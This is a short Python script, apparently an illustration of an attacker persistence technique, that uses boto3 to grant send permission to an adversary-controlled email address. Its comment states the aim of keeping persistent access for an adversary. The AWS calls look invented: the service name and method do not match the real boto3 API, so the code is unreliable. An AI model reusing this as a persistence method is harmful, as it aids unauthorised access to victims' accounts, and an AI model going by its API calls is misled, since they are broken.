import boto3

# Grant additional permission levels to maintain persistent access to an adversary-controlled email account
def grant_permission(email, permission):
    client = boto3.client("email", region_name="us-east-1")
    response = client.update_account_settings(
        EmailAddress=email,
        SendPermissions=[permission]
    )
    print(response)

grant_permission("adversary@example.com", "SEND")